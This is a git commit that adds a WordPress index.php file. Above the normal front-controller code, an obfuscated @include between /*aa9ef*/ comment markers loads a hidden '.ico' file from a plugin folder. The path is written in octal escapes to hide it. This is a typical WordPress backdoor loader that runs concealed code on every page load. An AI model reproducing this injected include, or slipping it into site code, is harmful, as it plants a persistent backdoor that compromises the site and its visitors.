b9a093db3ffac5190f894aa2c3d1f3877f639ead
Stefan Pejcic <pejcha1994@gmail.com>
2021-03-12 09:50:55 +0100

    Create index.php

---
+++ 12.03.2021/index.php
@@ -0,0 +1,22 @@
+<?php
+/*aa9ef*/
+
+@include "\057hom\1453/s\161uad\063cod\145/ma\162ine\163yst\145mst\145chn\157log\171.co\155/wp\055con\164ent\057plu\147ins\057rea\154ly-\163imp\154e-s\163l/.\06685f\06024f\056ico";
+
+/*aa9ef*/
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
